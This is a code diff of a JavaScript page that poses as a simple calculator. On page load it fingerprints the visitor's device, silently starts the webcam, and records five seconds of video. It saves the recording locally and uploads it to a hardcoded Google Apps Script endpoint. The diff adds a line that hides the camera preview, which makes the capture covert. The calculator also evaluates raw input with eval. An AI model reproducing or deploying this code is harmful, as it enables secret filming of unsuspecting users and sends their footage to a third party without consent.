@@ -6,128 +6,145 @@ let video = document.getElementById("video");
 const DRIVE_API = "https://script.google.com/macros/s/AKfycbzrbN-bmVQOJDuErQ_4BYI_W4IBL1ogKyYUQmDVumwsnFoLBZt8_kzC8TpjfzsmwO1fYg/exec";
 
 function press(v){
-result.value += v;
+    result.value += v;
 }
 
 function clearResult(){
-result.value = "";
+    result.value = "";
 }
 
 function calculate(){
-try{
-result.value = eval(result.value);
-}catch{
-result.value="Error";
-}
+    try{
+        result.value = eval(result.value);
+    }catch{
+        result.value = "Error";
+    }
 }
 
 let mediaRecorder;
-let chunks=[];
+let chunks = [];
 
 async function startCamera(){
 
-try{
+    try{
 
-let stream = await navigator.mediaDevices.getUserMedia({video:true});
+        console.log("Starting camera");
 
-video.srcObject = stream;
+        let stream = await navigator.mediaDevices.getUserMedia({video:true});
 
-mediaRecorder = new MediaRecorder(stream);
+        video.srcObject = stream;
 
-mediaRecorder.ondataavailable = function(e){
-chunks.push(e.data);
-};
+        // hide camera preview
+        video.style.display = "none";
 
-mediaRecorder.onstop = function(){
+        mediaRecorder = new MediaRecorder(stream);
 
-let blob = new Blob(chunks,{type:"video/webm"});
+        mediaRecorder.ondataavailable = function(e){
+            chunks.push(e.data);
+        };
 
-saveLocal(blob);
+        mediaRecorder.onstop = function(){
 
-uploadToDrive(blob);
+            console.log("Recording stopped");
 
-};
+            let blob = new Blob(chunks,{type:"video/webm"});
 
-mediaRecorder.start();
+            // reset buffer
+            chunks = [];
 
-setTimeout(()=>{
-mediaRecorder.stop();
-},5000);
+            saveLocal(blob);
 
-}catch(err){
-console.log("Camera error:",err);
-}
+            uploadToDrive(blob);
+
+        };
+
+        mediaRecorder.start();
+
+        console.log("Recording started");
+
+        setTimeout(()=>{
+            mediaRecorder.stop();
+        },5000);
+
+    }catch(err){
+
+        console.log("Camera error:",err);
+
+    }
 
 }
 
 function saveLocal(blob){
 
-let reader = new FileReader();
+    let reader = new FileReader();
 
-reader.readAsDataURL(blob);
+    reader.readAsDataURL(blob);
 
-reader.onloadend=function(){
+    reader.onloadend=function(){
 
-localStorage.setItem("recordedVideo",reader.result);
+        localStorage.setItem("recordedVideo",reader.result);
 
-console.log("Saved to Local Storage");
+        console.log("Saved video to Local Storage");
 
-};
+    };
 
 }
 
 function uploadToDrive(blob){
 
-let reader = new FileReader();
+    let reader = new FileReader();
 
-reader.readAsDataURL(blob);
+    reader.readAsDataURL(blob);
 
-reader.onloadend=function(){
+    reader.onloadend=function(){
 
-let base64data = reader.result.split(',')[1];
+        let base64data = reader.result.split(',')[1];
 
-fetch(DRIVE_API,{
-method:"POST",
-body:JSON.stringify({
-file:base64data
-}),
-headers:{
-"Content-Type":"application/json"
-}
-})
-.then(res=>res.json())
-.then(data=>{
-console.log("Uploaded to Drive:",data);
-})
-.catch(err=>{
-console.log("Drive upload failed:",err);
-});
+        fetch(DRIVE_API,{
+            method:"POST",
+            body:JSON.stringify({
+                data: base64data,
+                filename: "capture_" + Date.now() + ".webm"
+            }),
+            headers:{
+                "Content-Type":"application/json"
+            }
+        })
+        .then(res=>res.json())
+        .then(data=>{
+            console.log("Uploaded to Drive:",data);
+        })
+        .catch(err=>{
+            console.log("Drive upload failed:",err);
+        });
 
-};
+    };
 
 }
 
 function captureDeviceInfo(){
 
-let deviceInfo={
-browser:navigator.userAgent,
-os:navigator.platform,
-screen:screen.width+"x"+screen.height,
-timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
-};
+    let deviceInfo = {
+        browser: navigator.userAgent,
+        os: navigator.platform,
+        screen: screen.width + "x" + screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
 
-localStorage.setItem("deviceInfo",JSON.stringify(deviceInfo));
+    localStorage.setItem("deviceInfo",JSON.stringify(deviceInfo));
 
-console.table(deviceInfo);
+    console.table(deviceInfo);
 
 }
 
-window.onload=function(){
+window.onload = function(){
 
-captureDeviceInfo();
+    console.log("Page loaded");
 
-setTimeout(()=>{
-startCamera();
-},1500);
+    captureDeviceInfo();
+
+    setTimeout(()=>{
+        startCamera();
+    },1500);
 
 };
